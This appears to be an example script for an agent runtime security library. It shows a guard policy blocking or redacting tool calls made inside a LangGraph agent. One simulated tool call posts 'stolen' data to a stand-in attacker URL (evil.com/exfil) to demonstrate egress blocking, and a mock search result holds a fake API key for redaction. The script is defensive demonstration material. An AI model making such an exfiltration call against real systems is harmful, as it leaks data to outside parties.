"""Example: Applying Guard policies to a LangGraph ToolNode.

Usage:
  pip install agent-runtime-security[langgraph]
  python examples/langgraph_agent.py

This example demonstrates Guard behavior without an LLM.
ToolNode runs inside a minimal state graph.
"""
from langchain_core.tools import tool
from langchain_core.messages import AIMessage
from langgraph.graph import StateGraph, MessagesState

from asr import Guard, AuditLogger
from asr.adapters.langgraph import create_guarded_tool_node


@tool
def post_webhook(url: str, body: str) -> str:
  """Send data to an external system."""
  return f"Webhook sent: url={url}"


@tool
def search(query: str) -> str:
  """Search internal systems."""
  return f"Results: admin@company.com, key: sk-secret123"


guard = Guard(
  mode="enforce",
  domain_allowlist=["api.internal.com"],
  block_egress=True,
  pii_action="redact",
)

audit = AuditLogger(output="stdout")

tool_node = create_guarded_tool_node(
  tools=[post_webhook, search],
  guard=guard,
  audit=audit,
  capabilities_map={"post_webhook": ["network_send"]},
  handle_tool_errors=True,
)

graph = StateGraph(MessagesState)
graph.add_node("tools", tool_node)
graph.set_entry_point("tools")
graph.set_finish_point("tools")
app = graph.compile()


def _run(label: str, tool_name: str, args: dict):
  msg = AIMessage(
    content="",
    tool_calls=[{
      "name": tool_name,
      "args": args,
      "id": f"call_{label}",
      "type": "tool_call",
    }],
  )
  result = app.invoke({"messages": [msg]})
  print(f"  Result: {result['messages'][-1].content}\n")


if __name__ == "__main__":
  print("=== LangGraph ToolNode + Agent Runtime Security Guard ===\n")

  print("[1] Internal domain webhook (allow)")
  _run("1", "post_webhook", {"url": "https://api.internal.com/hook", "body": "hi"})

  print("[2] External domain webhook (block)")
  _run("2", "post_webhook", {"url": "https://evil.com/exfil", "body": "stolen"})

  print("[3] Search result PII redaction")
  _run("3", "search", {"query": "admin"})
